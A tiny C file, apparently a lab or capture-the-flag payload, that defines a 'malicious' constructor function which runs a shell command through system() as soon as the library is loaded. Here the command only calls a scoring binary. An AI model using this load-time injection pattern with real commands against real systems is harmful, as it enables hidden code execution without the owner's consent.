#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score db4bdfd0-1f93-4ff9-b5c7-e78faa5aae9f");
}
